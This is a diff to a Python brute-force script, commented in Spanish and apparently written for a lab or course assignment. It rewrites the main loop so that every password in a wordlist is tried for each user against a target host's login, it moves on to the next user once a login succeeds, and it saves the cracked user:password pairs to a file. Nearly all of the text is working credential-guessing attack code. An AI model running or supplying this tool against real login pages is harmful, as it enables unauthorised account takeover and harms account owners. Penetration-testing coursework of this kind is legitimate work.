@@ -63,56 +63,63 @@ def main():
         passwords = [l.strip() for l in f if l.strip()]
 
     session = requests.Session()
-    found = []
     start = time.time()
-
-    # Para no crear sesión nueva por cada intento 
-    # Ejecutamos por usuario: recorre todas las contraseñas (similar a hydra -L x -P y)
-    with ThreadPoolExecutor(max_workers=args.threads) as ex:
-        futures = []
-        for user in users:
-            for pw in passwords:
-                futures.append(ex.submit(try_login, session, args.host, user, pw, args.php))
-
-        # Iteramos y registramos
-        idx = 0
-        for fut in as_completed(futures):
-            idx += 1
-            success, reason, length = fut.result()
-            # Para simplificar: imprimimos cada cierto número
-            if idx % 500 == 0:
-                elapsed = time.time() - start
-                print(f"[{idx}/{len(futures)}] elapsed={elapsed:.1f}s")
-
-            # Si hay éxito lo registramos
-            if success:
-                # Necesitamos recuperar qué user/pass correspondió: no es trivial porque as_completed no entrega args.
-                # Aquí asumimos que la comprobación de la función ya nos dio ok: para identificar el par,
-                # es más práctico no usar as_completed (pero por claridad lo dejamos).
-                found.append((reason, length))
-
-    # Nota: para identificar los pares concretos y guardarlos, es más estable ejecutar por usuario secuencialmente:
-    # por simplicidad del entregable, añadimos una función alternativa fuera del pool para capturar correctamente:
-    # ---> ejecución secuencial para guardar resultados exactos:
     exact_found = []
-    for user in users:
-        for pw in passwords:
+    
+    print(f"Iniciando brute-force contra {args.host}")
+    print(f"Usuarios: {len(users)}, Contraseñas: {len(passwords)}")
+    print("=" * 50)
+    
+    # Ejecutamos por usuario: cuando encuentra una credencial válida, pasa al siguiente usuario
+    attempts = 0
+    for user_idx, user in enumerate(users, 1):
+        print(f"[{user_idx}/{len(users)}] Probando usuario: {user}")
+        user_found = False
+        
+        for pw_idx, pw in enumerate(passwords, 1):
+            attempts += 1
+            
+            # Mostrar progreso cada cierto número de intentos
+            if attempts % 100 == 0:
+                elapsed = time.time() - start
+                print(f"  -> Intentos: {attempts}, Tiempo transcurrido: {elapsed:.1f}s")
+            
             ok, reason, length = try_login(session, args.host, user, pw, args.php)
+            
             if ok:
-                print(f"[FOUND] {user}:{pw} ({reason}, body_len={length})")
+                print(f"[CREDENCIAL ENCONTRADA] {user}:{pw} ({reason}, body_len={length})")
                 exact_found.append((user, pw, reason, length))
+                user_found = True
+                break  # Pasar al siguiente usuario
+            else:
+                # Mostrar progreso para el usuario actual
+                if pw_idx % 50 == 0:
+                    print(f"  -> Probando contraseña {pw_idx}/{len(passwords)} para {user}")
+        
+        if not user_found:
+            print(f"No se encontró contraseña válida para {user}")
+        
+        print()  # Línea en blanco para separar usuarios
 
     elapsed = time.time() - start
+    
     # Guardar resultados
     with open(args.output, "w", encoding="utf-8") as outf:
         for u, p, reason, length in exact_found:
             outf.write(f"{u}:{p}  # {reason} len={length}\n")
 
-    print(f"Done. Tiempo total: {elapsed:.1f}s. Resultados guardados en {args.output}")
+    print("=" * 50)
+    print(f"RESUMEN FINAL:")
+    print(f"Tiempo total: {elapsed:.1f}s")
+    print(f"Intentos realizados: {attempts}")
+    print(f"Resultados guardados en: {args.output}")
+    
     if exact_found:
-        print("Credenciales válidas encontradas:")
-        for u,p,reason,length in exact_found:
-            print(f" - {u}:{p}  ({reason}, {length} bytes)")
+        print(f"\nCREDENCIALES VÁLIDAS ENCONTRADAS ({len(exact_found)}):")
+        for u, p, reason, length in exact_found:
+            print(f"  → {u}:{p}  ({reason}, {length} bytes)")
+    else:
+        print("\nNo se encontraron credenciales válidas.")
 
 if __name__ == "__main__":
     main()
